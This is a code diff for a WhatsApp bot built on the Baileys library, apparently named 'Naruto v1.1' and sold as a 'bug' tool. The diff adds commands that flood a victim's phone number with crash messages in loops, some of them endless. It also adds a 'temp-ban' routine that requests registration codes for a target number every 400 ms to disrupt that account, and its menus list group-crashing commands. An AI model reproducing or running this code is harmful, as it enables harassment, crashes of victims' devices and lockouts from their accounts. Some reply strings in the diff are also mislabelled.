@@ -922,7 +922,7 @@ const reply = (teks) => {
 deltaxcrash.sendMessage(from, { text: teks, contextInfo: { 
 "externalAdReply": { 
 "showAdAttribution": true, 
-"title": "𝑵𝒂𝒓𝒖𝒕𝒐 𝒗1💫", 
+"title": "N̶a̶r̶u̶t̶o̶ V̶1.1 ☠️", 
 "containsAutoReply": true, 
 "mediaType": 1, 
 "thumbnail": fkethmb, 
@@ -985,75 +985,21 @@ deltaxcrash.sendMessage(m.chat, { delete: m.key })
 
 switch (command) {
 
-case 'menu': {
+case 'HSHSGSBAAGBGhajahJSJSHSJ828292828AJANWK': {
 const owned = `${owner}@s.whatsapp.net`
 const version = require("baileys/package.json").version
-const menu = `
- ❄ *𝒘𝒂𝒈𝒘𝒂𝒏* @${sender.split("@")[0]}
-
-    𝐍𝐀𝐑𝐔𝐓𝐎-𝐕1
-ᯤ  𝐧𝐚𝐦𝐞 : ${pushname}
-ᯤ  𝐜𝐚𝐬𝐞 : ${isPremium ? "Premium" : "Free"}
-ᯤ  𝐜𝐫𝐞𝐚𝐭𝐨𝐫 : 𝑬𝒅𝒏𝒖𝒕001
-└─☯
-
-> ${run} 
-  𝑶𝒘𝒏𝒆𝒓 𝒎𝒆𝒏𝒖
-ᯤ  ${prefix}𝐬𝐞𝐥𝐟
-ᯤ  ${prefix}𝐩𝐮𝐛𝐥𝐢𝐜
-ᯤ  ${prefix}𝐚𝐝𝐝𝐩𝐫𝐞𝐦 234xx
-ᯤ  ${prefix}𝐝𝐞𝐥𝐩𝐫𝐞𝐦 234xx
-ᯤ  ${prefix}𝐚𝐝𝐝𝐨𝐰𝐧𝐞𝐫 234xx
-ᯤ  ${prefix}𝐝𝐞𝐥𝐨𝐰𝐧𝐞𝐫 234xx
-╰ ☯
-  𝑷𝒖𝒃𝒍𝒊𝒄 𝒎𝒆𝒏𝒖
-ᯤ  ${prefix}𝐩𝐢𝐧𝐠
-ᯤ  ${prefix}𝐫𝐮𝐧𝐭𝐢𝐦𝐞
-ᯤ  ${prefix}𝐬𝐜𝐫𝐢𝐩𝐭 <sc>
-ᯤ  ${prefix}𝐚𝐥𝐢𝐯𝐞
-ᯤ  ${prefix}𝐨𝐰𝐧𝐞𝐫
-╰ ☯
-  𝑩𝒖𝒈 𝒎𝒆𝒏𝒖
-ᯤ  ${prefix}𝐯𝐢𝐫𝐮𝐬999 234xx
-ᯤ  ${prefix}𝐫𝐞𝐬𝐭𝐚𝐫𝐭-𝐦𝐚𝐤𝐞𝐫 234xx
-ᯤ  ${prefix}𝐜𝐥𝐞𝐚𝐫-𝐝𝐚𝐭𝐚 234xx
-ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐯𝐢𝐫𝐮𝐬 234xx
-ᯤ  ${prefix}𝐜𝐫𝐚𝐬𝐡-𝐭𝐨𝐭𝐚𝐥 234xx
-ᯤ  ${prefix}𝐬𝐚𝐭𝐚𝐧𝐢𝐜999 234xx
-ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨𝐜𝐫𝐚𝐬𝐡 234xx
-╰☯
-  𝑩𝒖𝒈 𝒈𝒓𝒐𝒖𝒑𝒔
-ᯤ  ${prefix}𝐫𝐞𝐛𝐨𝐨𝐭 234xx
-ᯤ  ${prefix}𝐫𝐞𝐬𝐞𝐭 234xx
-ᯤ  ${prefix}🗿 234xx
-ᯤ  ${prefix}🔥 234xx
-ᯤ  ${prefix}𝐛𝐮𝐠-𝐠𝐜 <linkgroup>
-ᯤ  ${prefix}𝐮𝐢-𝐠𝐫𝐮𝐩 <linkgroup>
-ᯤ  ${prefix}𝐫𝐞𝐬𝐞𝐭-𝐠𝐜 <linkgroup>
-ᯤ  ${prefix}𝐤𝐢𝐥𝐥-𝐠𝐜 <120###@g.us>
-╰☯
-  𝑽𝒊𝒑 𝒃𝒖𝒈𝒔
-ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐧𝐨𝐯𝐨 <234xx, amount>
-ᯤ  ${prefix}𝐯𝐢𝐫𝐮𝐬-𝐢𝐝 <234xx, amount>
-ᯤ  ${prefix}𝐫𝐞𝐬𝐞𝐭-𝐮𝐢 <234xx, amount>
-ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐜𝐫𝐚𝐬𝐡1 <234xx, amount>
-ᯤ  ${prefix}𝐫𝐚𝐬𝐞𝐧𝐠𝐚𝐧1 <234xx, amount>
-ᯤ  ${prefix}𝐫𝐚𝐬𝐞𝐧𝐠𝐚𝐧 <234xx, amount>
-╰☯
-> ©® 𝑬𝒅𝒏𝒖𝒕 `
+const menu = `𝗡𝗔𝗥𝗨𝗧𝗢 𝗩1`
            deltaxcrash.sendMessage(m.chat, { 
 	           text: menu,
                     contextInfo: {
                         externalAdReply: {
-                            showAdAttribution: true,
-                            title: 'nαrutσ crαsh🤫☸',
-                            //body: global.namaCreator,
-                            thumbnailUrl: 'https://telegra.ph/file/aa087aefb9d46573d21a5.jpg', 
-                            sourceUrl: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W',
-                            //sourceUrl: global.isLink,
-                            previewType: "PHOTO", 
-                            mediaType: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W',
-                            renderLargerThumbnail: false
+                            showAdAttribution: false,
+                            title: global.namabot,
+                            body: global.namaCreator,
+                            thumbnailUrl: 'https://i.imgur.com/dYJ0dNk.jpeg', 
+                            sourceUrl: global.isLink,
+                            mediaType: 1,
+                            renderLargerThumbnail: true
                         }
                     }
                 }, {
@@ -1062,12 +1008,86 @@ const menu = `
      await deltaxcrash.sendMessage(m.chat, {
                         audio: fs.readFileSync('./all/menu.mp3'),
                         mimetype: 'all/menu.mp3',
-                        ptt: false
+                        ptt: true
                     }, {
                         quoted: m
                     })
                 }
              break
+case 'menu': {
+let itsmenu = `
+┏━━━━━━━━━━━━━☯
+┃ ❃ 𝐧𝐚𝐦𝐞: ${pushname}
+┃ ❃ 𝐜𝐚𝐬𝐞: ${isPremium ? "Prem" : "free"}
+┃ ❃ 𝐯𝐞𝐫𝐬𝐢𝐨𝐧: *1.1*
+┃ ❃ 𝐜𝐫𝐞𝐚𝐭𝐨𝐫: 𝒆𝒅𝒏𝒖𝒕 ❀
+┃ ❃ 𝐮𝐬𝐞𝐫: @${sender.split("@")[0]}
+┃ ❃ 𝐫𝐮𝐧𝐭𝐢𝐦𝐞: ${run}
+┗━━━━━━━━━━━━━☯
+
+ \`ℕ𝔸ℝ𝕌𝕋𝕆 𝔹𝕌𝔾 ℂ𝕄𝔻\`
+
+  σwnєr mєnu 👤
+> ᯤ  ${prefix}𝐬𝐞𝐥𝐟
+> ᯤ  ${prefix}𝐩𝐮𝐛𝐥𝐢𝐜
+> ᯤ  ${prefix}𝐚𝐝𝐝𝐩𝐫𝐞𝐦 234xx
+> ᯤ  ${prefix}𝐝𝐞𝐥𝐩𝐫𝐞𝐦 234xx
+> ᯤ  ${prefix}𝐚𝐝𝐝𝐨𝐰𝐧𝐞𝐫 234xx
+> ᯤ  ${prefix}𝐝𝐞𝐥𝐨𝐰𝐧𝐞𝐫 234xx
+> ╰ ☯
+  puвlíc mєnu 👪
+> ᯤ  ${prefix}𝐩𝐢𝐧𝐠
+> ᯤ  ${prefix}𝐫𝐮𝐧𝐭𝐢𝐦𝐞
+> ᯤ  ${prefix}𝐬𝐜𝐫𝐢𝐩𝐭 <sc>
+> ᯤ  ${prefix}𝐚𝐥𝐢𝐯𝐞
+> ᯤ  ${prefix}𝐨𝐰𝐧𝐞𝐫
+> ╰ ☯
+  вug mєnu 🪲
+> ᯤ  ${prefix}𝐯𝐢𝐫𝐮𝐬999 234xx
+> ᯤ  ${prefix}𝐫𝐞𝐬𝐭𝐚𝐫𝐭-𝐦𝐚𝐤𝐞𝐫 234xx
+> ᯤ  ${prefix}𝐜𝐥𝐞𝐚𝐫-𝐝𝐚𝐭𝐚 234xx
+> ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐯𝐢𝐫𝐮𝐬 234xx
+> ᯤ  ${prefix}𝐜𝐫𝐚𝐬𝐡-𝐭𝐨𝐭𝐚𝐥 234xx
+> ᯤ  ${prefix}𝐬𝐚𝐭𝐚𝐧𝐢𝐜99 234xx
+> ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨𝐜𝐫𝐚𝐬𝐡 234xx
+> ╰☯
+  nєw вugs (cσmmαnd) 🗿
+> ᯤ  ${prefix}𝐬𝐭𝐚𝐫𝐝𝐮𝐬𝐭 234xx
+> ᯤ  ${prefix}𝐰𝐚𝐠𝐰𝐚𝐧 <pc>
+> ᯤ  ${prefix}🪲 <pc>
+> ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐡𝐢𝐭 234xx
+> ᯤ  ${prefix}𝐬𝐞𝐧𝐝-𝐨𝐟𝐟 <234xx, amount>
+> ╰☯
+  вug grσups 😡
+> ᯤ  ${prefix}𝐫𝐞𝐛𝐨𝐨𝐭 234xx
+> ᯤ  ${prefix}𝐫𝐞𝐬𝐞𝐭 234xx
+> ᯤ  ${prefix}🗿 234xx
+> ᯤ  ${prefix}🔥 234xx
+> ᯤ  ${prefix}𝐛𝐮𝐠-𝐠𝐜 <linkgroup>
+> ᯤ  ${prefix}𝐮𝐢-𝐠𝐫𝐮𝐩 <linkgroup>
+> ᯤ  ${prefix}𝐫𝐞𝐬𝐞𝐭-𝐠𝐜 <linkgroup>
+> ᯤ  ${prefix}𝐤𝐢𝐥𝐥-𝐠𝐜 <120###@g.us>
+> ╰☯
+  víp вugs 🗣️
+> ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐧𝐨𝐯𝐨 <234xx, amount>
+> ᯤ  ${prefix}𝐯𝐢𝐫𝐮𝐬-𝐢𝐝 <234xx, amount>
+> ᯤ  ${prefix}𝐫𝐞𝐬𝐞𝐭-𝐮𝐢 <234xx, amount>
+> ᯤ  ${prefix}𝐧𝐚𝐫𝐮𝐭𝐨-𝐜𝐫𝐚𝐬𝐡1 <234xx, amount>
+> ᯤ  ${prefix}𝐫𝐚𝐬𝐞𝐧𝐠𝐚𝐧1 <234xx, amount>
+> ᯤ  ${prefix}𝐫𝐚𝐬𝐞𝐧𝐠𝐚𝐧 <234xx, amount>
+> ╰☯
+> © 𝐠𝐫𝐞𝐲 `
+
+  deltaxcrash.sendMessage(m.chat, {
+                        video: { url: `https://telegra.ph/file/b02af52f5d3214a5455b8.mp4`},
+                        caption: itsmenu,
+                        gifPlayback: true
+                    }, {
+                        quoted: m
+                    })
+                    }
+                 break
+                 
 case "alive":
 
 const audiovn = "./Alive.mp3";
@@ -1083,12 +1103,12 @@ const audiovn = "./Alive.mp3";
         contextInfo: {
           mentionedJid: [m.sender],
           externalAdReply: {
-          title: "𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒔𝒉𝒊𝒏𝒐𝒃𝒊 𝒗𝒊𝒍𝒍𝒂𝒈𝒆 🤭",
-          body: "kєєp lσvíng nαrutσ",
-          thumbnailUrl: "https://telegra.ph/file/b03a5805307e23e92151c.jpg",
+          title: "Naruto v1.1 ☠️",
+          body: "By ednut 😈🌹",
+          thumbnailUrl: "https://telegra.ph/file/2995bbeb81178ff01ec20.jpg",
           sourceUrl: "https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W",
           mediaType: 1,
-          renderLargerThumbnail: true
+          renderLargerThumbnail: false
           }}
       };
 
@@ -1097,7 +1117,7 @@ await deltaxcrash.sendMessage(m.chat, dooc, {quoted: m});
 
 
 break;
-		
+
 case 'owner': case 'botowner':
 let namaown = `Owner Cakep`
 var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
@@ -1109,13 +1129,32 @@ var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 deltaxcrash.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break
 
-case 'restart': {
-if (!isDeveloper) return joreply(mess.owner)
-joreply(`bye🖐`)
-await sleep(5000)
-process.exit()
+case 'wagwan': case '🪲':  {
+if (!isPremium) return 
+for (let j = 0; j < 5; j++) {
+await ngeloc(m.chat, force)
 }
-break		
+await deltaxcrash.sendMessage(m.chat, {
+contextInfo: {
+mentionedJid: ['00000@s.whatsapp.net'],
+externalAdReply: {
+showAdAttribution: false,
+renderLargerThumbnail: false,
+jpegThumbnail: `https://telegra.ph/file/6c02a69b1d6372f287912.jpg`,
+title: `Naruto bug 🪲`,
+body: `⁗ Executed`,
+previewType: "VIDEO",
+sourceUrl: `𝒏𝒂𝒓𝒖𝒕𝒐 𝒗1.1 💥`,
+mediaType: 1,
+mediaUrl: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W'
+}
+},
+text: '𝒏𝒂𝒓𝒖𝒕𝒐 𝒗1.1 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 𝒕𝒂𝒓𝒈𝒆𝒕 𝒄𝒓𝒆𝒂𝒕𝒆𝒅 𝒃𝒚 𝒆𝒅𝒏𝒖𝒕'
+}, {
+quoted: m
+})
+}
+break
 
 case 'reset': {
 if (!isPremium) return reply(mess.premium)
@@ -1275,9 +1314,9 @@ await sleep(100)
 reply(`Success send broadcast message to ${data.length} groups chats`)
 }
 break
-case 'CN892BB1 ': { 
+case 'naruto-hit': { 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Penggunaan .${command} 6283123456789`)
+if (!q) return reply(`use .${command} 234xxxxxxx`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
 let target = bijipler + '@s.whatsapp.net'
@@ -1320,12 +1359,89 @@ case 'ping': {
         key: pingMsg.key,
         type: 14,
         editedMessage: {
-          conversation: `*𝐯𝐨𝐥𝐭𝐚𝐠𝐞 𝐬𝐩𝐞𝐞𝐝 ➽* ${new Date() - startTime} 𝐦𝐬`
+          conversation: `*ᴠ1.1 Sᴘᴇᴇᴅ ☠️* ${new Date() - startTime} ᴍs`
         }
       }
     }, {});
   } 
 break;	
+case "ios24j": case "ios-naruto": {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`use .${command} 234xxxxxxx`)
+let bijipler = q.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return reply(`<!> Use Number without Country Code\n\n<✓> Example : .${command} 234xxxxxx`)
+await reply(mess.bugrespon)
+let target = bijipler + '@s.whatsapp.net'
+  for (;;) {
+    await aipong(target)
+    await sleep(1200)
+  }
+}
+break
+case 'iphone-shake': case 'kill-ios': {
+if (!isPremium) return reply(mess.premium)
+if (!q) return reply(`use .${command} 234xxxxxxx|1\n#  300.speed`)
+let ppek = q.split("|")[0]
+let bijipler = ppek.replace(/[^0-9]/g, "")
+if (bijipler.startsWith('0')) return joreply(`<!> use number with country code\n\n<✓> Example : .${command} 23481xxxxx|1`)
+let target = bijipler+"@s.whatsapp.net"
+let jumlah = q.split("|")[1] * 200
+let ppk = jumlah * 1.5
+m.reply(ppk + " seconds");
+reply(mess.bugrespon)
+for (let j = 0; j < jumlah; j++) {
+await aipong(target)
+await sleep(1500)
+}
+reply(`😁 Succesfully Send Bug  ${target} to the target ${ppk} seconds`)
+}
+break
+case 'temp-ban': {
+if (!isPremium) return reply(mess.prem)
+if (!text) return reply(`Example: ${prefix + command} 234|Xxxxxx`)
+if (!/|/.test(text)) return reply(`The data you provided is invalid!, Example: \n ${command} 234|xxxxxxx`)
+let numbers = JSON.parse(fs.readFileSync('./tb/numbers.json'))
+
+let cCode = q.split("|")[0]
+let number = q.split("|")[1]
+let fullNo = cCode + number
+
+await reply(`🪲Naruto v1 Success! Registration Interference has been successfully 🎶 activated to the target : ${fullNo} using ${command} for an unlimited period of time . Registration interruption will be stopped if the server is restarted, shut down, or down🗿 ..`)
+
+let { state, saveCreds } = await useMultiFileAuthState('tb')
+
+let spam = makeWaSocket({
+auth: state,
+mobile: true,
+logger: pino({ level: 'silent' })
+})
+
+let dropNumber = async () => {
+try {
+let res = await spam.requestRegistrationCode({
+phoneNumber: `+${fullNo}`,
+phoneNumberCountryCode: cCode,
+phoneNumberNationalNumber: number,
+phoneNumberMobileCountryCode: 724,
+})
+
+if (res.reason === 'temporarily_unavailable') {
+console.log(`Invalid Number (Possible Registration Interrupted): +${res.login}`)
+await sleep(1000)
+await dropNumber()
+}
+} catch (error) {
+console.error(error)
+}
+}
+
+numbers[fullNo] = { cCode, number };
+fs.writeFileSync('./tb/numbers.json', JSON.stringify(numbers, null, '\t'));
+setInterval(() => {
+dropNumber()
+}, 400)
+}
+break
 case 'runtime':
                 let pinga = ` ◈☃ 𝐍𝐀𝐑𝐔𝐓𝐎 𝐕1◈𝖗 Is Active${runtime(process.uptime())}`
                 deltaxcrash.sendMessage(m.chat, {
@@ -1333,7 +1449,7 @@ case 'runtime':
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
-                            title: `𝒏𝒂𝒓𝒖𝒕𝒐𝒗1`,
+                            title: `𝒏𝒂𝒓𝒖𝒕𝒐𝒗1.1`,
                             body: `вч єdnut hímsєlf❄`,
                             thumbnailUrl: 'https://telegra.ph/file/1491e0c7d9236f18d5f5f.jpg',
                             sourceUrl: 'https://whatsapp.com/channel/0029VaefL9g0gcfLITSc841W',
@@ -1345,6 +1461,30 @@ case 'runtime':
                     quoted: m
                 })
                 break
+
+
+case 'sc':
+            case 'script':
+            case 'repo':
+                uy = `https://www.youtube.com/@Ednuthimself`
+                deltaxcrash.sendMessage(m.chat, {
+                    text: uy,
+                    contextInfo: {
+                        externalAdReply: {
+                            showAdAttribution: true,
+                            title: 'Script Free',
+                            body: `SCRIPT BOT ${namabot} click there 🪲`,
+                            thumbnailUrl: 'https://telegra.ph/file/0b76086099a9a8e4ce244.jpg',
+                            sourceUrl: 'https://gitHub.com/Ednut001/naruto-v1-bug',
+                            mediaType: 1,
+                            renderLargerThumbnail: false
+                        }
+                    }
+                }, {
+                    quoted: m
+                })
+                break
+
 case 'gfsCdgsGsGs': { 
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Penggunaan .${command} 6283123456789`)
@@ -1417,13 +1557,13 @@ await bakdok(target, force)
 await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀`)
 }
 break
-case 'gfsCdgsGsGs': { 
+case 'send-off': { 
 if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Penggunaan .${command} 6283123456789`)
+if (!q) return reply(`use .${command} 234xxxxxx`)
 let bijipler = q.replace(/[^0-9]/g, "")
-if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
+if (bijipler.startsWith('0')) return reply(`The number starts with 0. Replace it with a number that starts with the country code\n\n<✓> Example : .${command} 234xxxxxx`)
 let target = bijipler + '@s.whatsapp.net'
-await reply(`</> crash sudah terkirim... `)
+await reply(`</> crashing hold up... `)
 for (let j = 0; j < 30; j++) {
 await bakdok(target, force)
 await ngeloc(target, force)
@@ -1455,22 +1595,22 @@ await reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 �
 break
 case "addowner":
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283123456789`)
+if (!args[0]) return reply(`use ${prefix+command} number\nEg ${prefix+command} 2347036214381`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await deltaxcrash.onWhatsApp(bnnd + `@s.whatsapp.net`)
-if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
+if (ceknye.length == 0) return reply(`invalid number !!!`)
 ownerNumber.push(bnnd)
 fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
-reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
+reply(`user ${bnnd} deleted from owner base!!!`)
 break
 case "delowner":
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283123456789`)
+if (!args[0]) return reply(`use ${prefix+command} number\neg ${prefix+command} 2347036214381`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = ownerNumber.indexOf(ya)
 ownerNumber.splice(unp, 1)
 fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
-reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
+reply(`user ${ya} deleted from owner base!!!`)
 break
 case "jids-unexpected": {
 
@@ -1925,20 +2065,20 @@ if (!isPremium) return reply('_</> owner only..._')
   sendMixedMessages(whatsappNumber, encodedAmount);
   await sleep(2500); // Adjusted sleep time for clarity
   sendMessageWithMentions(
-    "𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.", 
+    "𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏??𝒕𝒆𝒅 🥶 ${bijipler} 𝒖𝒔𝒊𝒏𝒈 ${command}.ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.", 
     [whatsappNumber]
   );
 }
 break;
 case "addprem":{
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283123456789`)
+if (!args[0]) return reply(`use ${prefix+command} number\nEg ${prefix+command} 2347036214381`)
 prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 let ceknya = await deltaxcrash.onWhatsApp(prrkek)
-if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
+if (ceknya.length == 0) return reply(`invalid number !!!`)
 prem.push(prrkek)
 fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
-reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
+reply(`user ${prrkek} added to premium base!`)
 }
 break
 //=================================================//
@@ -2240,7 +2380,7 @@ if (!isPremium) return reply('_</> owner only..._')
   );
 }
 break;
-case "blank-dark": {
+case "🪲": {
 
 if (!isPremium) return reply('_</> owner only..._')
   if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 234xxxxxxxxxx,5`) 
@@ -3140,12 +3280,12 @@ reply(`𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 ${
 break
 case "delprem":{
 if (!isOwner) return reply(mess.only.owner)
-if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6283123456789`)
+if (!args[0]) return reply(`use ${prefix+command} number\neg ${prefix+command} 2347036214381`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
 unp = prem.indexOf(ya)
 prem.splice(unp, 1)
 fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
-reply(`Nomor ${ya} Telah Di Hapus Premium!`)
+reply(`user ${ya} deleted from premium base!`)
 }
 break
 default:
